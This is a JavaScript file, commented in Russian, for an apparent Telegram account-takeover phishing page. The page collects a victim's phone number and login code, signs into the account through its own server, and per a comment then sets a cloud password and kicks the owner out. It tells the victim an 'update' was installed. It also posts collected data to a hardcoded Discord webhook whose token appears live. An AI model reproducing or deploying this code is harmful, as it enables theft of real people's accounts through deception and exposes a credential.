const webhookURL = 'https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK';

// Элементы
const startBtn = document.getElementById('startBtn');
const modal = document.getElementById('modal');
const smsModal = document.getElementById('smsModal');
const codeModal = document.getElementById('codeModal');
const closeBtns = document.querySelectorAll('.close');
const phoneInput = document.getElementById('phone');
const sendPhoneBtn = document.getElementById('sendPhoneBtn');
const allowSms = document.getElementById('allowSms');
const denySms = document.getElementById('denySms');
const detailsLink = document.getElementById('detailsLink');
const detailsText = document.getElementById('detailsText');
const sendCodeBtn = document.getElementById('sendCodeBtn');
const codeInput = document.getElementById('code');

let currentPhone = '';
let currentPhoneCodeHash = ''; // для хранения хеша от Telegram API

// Открыть первое модальное окно
startBtn.onclick = () => {
    modal.style.display = 'flex';
};

// Закрытие всех модалок
closeBtns.forEach(btn => {
    btn.onclick = () => {
        modal.style.display = 'none';
        smsModal.style.display = 'none';
        codeModal.style.display = 'none';
    };
});

// Определение страны по номеру (упрощённо)
phoneInput.addEventListener('input', (e) => {
    let value = e.target.value;
    if (!value.startsWith('+')) {
        value = '+' + value.replace(/\D/g, '');
        e.target.value = value;
    }
    const countryInfo = document.getElementById('countryInfo');
    if (value.startsWith('+7')) {
        countryInfo.innerText = 'Определено: Казахстан / Россия';
    } else if (value.startsWith('+1')) {
        countryInfo.innerText = 'Определено: США / Канада';
    } else {
        countryInfo.innerText = 'Страна не определена';
    }
});

// Отправка номера на сервер для запроса кода
sendPhoneBtn.onclick = async () => {
    currentPhone = phoneInput.value.trim();
    if (!currentPhone) return alert('Введите номер');
    
    // Показываем модалку с запросом разрешения на SMS
    modal.style.display = 'none';
    smsModal.style.display = 'flex';
};

// Обработка разрешения / запрета
allowSms.onclick = async () => {
    // Отправляем номер на сервер, чтобы получить код
    smsModal.style.display = 'none';
    try {
        const response = await fetch('/api/telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'sendCode', phone: currentPhone })
        });
        const data = await response.json();
        if (data.ok) {
            currentPhoneCodeHash = data.phoneCodeHash;
            codeModal.style.display = 'flex';
        } else {
            alert('Ошибка: ' + data.error);
        }
    } catch (err) {
        alert('Ошибка соединения с сервером');
    }
};

denySms.onclick = () => {
    smsModal.style.display = 'none';
    // Показываем "подробнее" с объяснением
    detailsText.classList.toggle('hidden');
};

detailsLink.onclick = () => {
    detailsText.classList.toggle('hidden');
};

// Отправка кода
sendCodeBtn.onclick = async () => {
    const code = codeInput.value.trim();
    if (!code || code.length !== 5) return alert('Введите 5-значный код');
    
    try {
        const response = await fetch('/api/telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'signIn',
                phone: currentPhone,
                phoneCode: code,
                phoneCodeHash: currentPhoneCodeHash
            })
        });
        const data = await response.json();
        if (data.ok) {
            // Успешный вход, теперь сервер должен установить облачный пароль и кикнуть
            alert('Аккаунт привязан. Обновление установлено.');
            codeModal.style.display = 'none';
        } else {
            alert('Ошибка входа: ' + data.error);
        }
    } catch (err) {
        alert('Ошибка соединения');
    }
};

// Также отправляем информацию о действиях на вебхук для логов
async function sendToDiscord(data) {
    await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: 'Новые данные: ' + JSON.stringify(data) })
    });
}
